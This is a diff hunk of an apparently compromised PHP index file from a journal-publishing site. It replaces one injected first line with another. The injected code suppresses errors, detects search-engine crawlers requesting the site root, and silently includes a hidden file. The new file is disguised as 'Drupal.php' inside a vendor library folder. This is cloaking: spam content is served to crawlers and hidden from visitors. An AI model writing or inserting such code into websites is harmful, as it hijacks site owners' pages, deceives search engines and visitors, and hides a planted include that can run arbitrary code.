@@ -1,4 +1,4 @@
-<?php error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){ include('/home/u414331547/domains/ijcsb.com/public_html/jobs/doi/Issue.php'); exit; }
+<?php error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){ include('/home/u414331547/domains/cgcjr.com/public_html/lib/pkp/lib/vendor/doctrine/dbal/src/Drupal.php'); exit; }
 
 /**
  * @defgroup index Index
